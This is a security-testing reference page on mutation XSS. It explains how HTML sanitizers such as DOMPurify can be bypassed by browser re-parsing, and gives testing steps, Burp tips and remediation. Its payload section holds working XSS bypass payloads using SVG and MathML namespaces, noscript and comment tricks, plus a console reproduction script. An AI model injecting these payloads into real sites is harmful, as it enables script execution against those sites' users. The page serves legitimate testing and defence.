# Mutation XSS (mXSS)

## Overview
Mutation XSS (mXSS) is a class of XSS vulnerability where a payload that appears safe after initial sanitization is later transformed by the browser's HTML parser into a form that executes JavaScript. The attack exploits discrepancies between how an HTML sanitizer parses a string and how the browser's internal DOM parser re-serializes and re-parses the same content. A string that a sanitizer deems harmless can, after being set as `innerHTML` and re-read, become an executable script — effectively "mutating" into a dangerous form.

## How It Works
When a sanitizer processes HTML, it builds an internal parse tree and determines that no dangerous elements or attributes remain. However, when the sanitized HTML string is then assigned to `element.innerHTML`, the browser's own HTML parser processes it again. Due to parser differences, legacy quirks mode, namespace handling (SVG/MathML), context-dependent parsing rules, and attribute reordering, the DOM representation may differ from what the sanitizer produced. If the sanitized output is then re-serialized (e.g., via `element.innerHTML` read-back) and re-inserted, a further parse pass can create a completely different DOM structure — one that contains executable elements. DOMPurify has had multiple mXSS vulnerabilities over the years, demonstrating how subtle these issues are.

## Impact
- Bypass of seemingly robust HTML sanitizers, including DOMPurify
- XSS execution even when developers follow best practices of using a sanitization library
- High severity because it undermines the defense developers believe they have deployed
- Exploitation of applications that sanitize rich-text editor output

## Where to Look
- Applications using DOMPurify (especially older versions pre-3.x)
- Applications using browser-native `DOMParser` for sanitization
- Rich-text editors (Quill, Froala, TinyMCE, CKEditor) with custom sanitization wrappers
- Applications that sanitize HTML server-side (e.g., Python's bleach, Ruby's Sanitize gem) then render it client-side via `innerHTML`
- Two-stage rendering pipelines: sanitize → store → retrieve → re-render
- Template engines that pass HTML through multiple transformation steps
- Applications that read and re-set `innerHTML` (e.g., to highlight search terms in user content)

## Testing Steps
1. Identify the sanitization library in use (check JavaScript source for DOMPurify, sanitize-html, etc.) and note its version.
2. Submit known mXSS payloads targeting the identified library's version-specific parsing quirks.
3. Test in a browser console: set a payload as `innerHTML` of a div, read it back, then set it as `innerHTML` again — observe if the DOM structure changes.
4. Check for SVG and MathML namespace payloads since these often trigger parser mutation.
5. Try payloads with unusual nesting — tables inside inline elements, which HTML5 parsers restructure ("foster parenting").
6. Use browser DevTools to inspect the actual DOM after sanitization vs. after re-insertion.
7. Monitor whether the sanitizer version has known CVEs listing specific mXSS payloads.
8. Test double-encoding and entity nesting scenarios.

## Payloads / Techniques

**Classic mXSS via SVG namespace (DOMPurify bypass - historical):**
```html
<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
```

**MathML namespace mutation:**
```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><mtext></mglyph><malignmark></mtext><img src=x onerror=alert(1)>
```

**Table foster-parenting mutation:**
```html
<table><td><a><img src=1 onerror=alert(1)></a></table>
```
Some sanitizers allow `<a>` and `<img>` but the browser restructures the table, placing the `<img>` outside where the event handler fires.

**SVG with `<use>` element (older DOMPurify):**
```html
<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
```

**Attribute mutation — `formaction`:**
```html
<form><button formaction="javascript:alert(1)">click
```
If the sanitizer allows `<button>` but does not check `formaction`, clicking triggers execution.

**Noscript mutation (context-dependent parsing):**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
With JS enabled, `<noscript>` content is not parsed as HTML, so the sanitizer sees no threat. But after some mutations, content becomes active.

**The double-insertion test in browser console:**
```javascript
// Reproduce mXSS behavior manually:
var div1 = document.createElement('div');
div1.innerHTML = '<svg><p><style><g title="</style><img src=x onerror=alert(1)>">';
var sanitized = div1.innerHTML;
console.log('After first parse:', sanitized);

var div2 = document.createElement('div');
div2.innerHTML = sanitized; // Second parse — mutation may occur here
console.log('After second parse:', div2.innerHTML);
```

**DOMPurify bypass (specific versions — always check current CVEs):**
```html
<!-- DOMPurify < 2.4.0 bypass via nesting -->
<svg><animatetransform onbegin=alert(1)>
<!-- Check https://github.com/cure53/DOMPurify/blob/main/CHANGELOG.md for version-specific payloads -->
```

**Template literal via DOM clobbering + mXSS:**
```html
<form id=x><input name=ownerDocument></form>
<img src=1 onerror="alert(document.forms.x.ownerDocument)">
```

**HTML comment mutation:**
```html
<!--<img src="--><img src=x onerror=alert(1)>
```
Some parsers handle comments differently, mutating the structure.

## Burp Suite Tips
- mXSS is fundamentally a client-side parsing behavior — use **Burp's embedded browser** (with DevTools open) to test mutations interactively.
- Use **Burp Repeater** to submit payloads and copy the sanitized output from the response, then manually test it in the browser console.
- Set up a **Burp Collaborator** callback in your payloads to detect blind execution in cases where mutation fires in a context you can't directly observe.
- Use the **DOM Invader** tool — enable "Mutation XSS" detection mode to automatically test for mXSS behaviors in the active page.
- Search **JavaScript source files** in Burp's site map for the sanitizer library name and version to identify which mXSS CVEs may apply.
- In Burp's **Extensions > BApp Store**, install the **Software Vulnerability Scanner** to identify outdated DOMPurify versions in target JS.

## Tools
- DOMPurify — https://github.com/cure53/DOMPurify (review CHANGELOG for historical bypasses)
- Burp Suite Pro with DOM Invader
- mXSS payloads collection — https://github.com/cure53/H5SC
- Securitum mXSS research — https://research.securitum.com/mutation-based-xss-attacks/
- retire.js — identifies outdated JavaScript libraries with known vulnerabilities
- Browser DevTools (Console, Elements tab) for manual mutation testing

## Remediation
- **Keep sanitization libraries up to date**: DOMPurify is actively maintained; update to the latest version as new mXSS bypasses are regularly patched.
- **Single parse**: Avoid passing HTML through multiple serialization/parse cycles. If content is sanitized once, do not re-serialize and re-parse it.
- **Use `textContent` over `innerHTML`**: When inserting data that doesn't require HTML formatting, always use `textContent` — it never parses HTML.
- **Validate sanitizer output against a strict allowlist**: After sanitization, validate that only explicitly allowed tags and attributes remain. Reject anything that doesn't match.
- **Server-side and client-side**: Apply sanitization server-side (using a validated library) AND client-side before insertion into the DOM — defense in depth.
- **CSP with nonces**: A strict nonce-based CSP blocks script execution even if mXSS produces a `<script>` tag, as the injected script has no valid nonce.
- **Automated regression testing**: Include mXSS payload test cases in your CI/CD security tests using a tool like MXSS-Tester.

## References
https://research.securitum.com/mutation-based-xss-attacks/
https://cure53.de/fp170.pdf
https://github.com/cure53/DOMPurify/blob/main/CHANGELOG.md
https://portswigger.net/research/mutation-xss-via-namespace-confusion
https://owasp.org/www-community/attacks/xss/
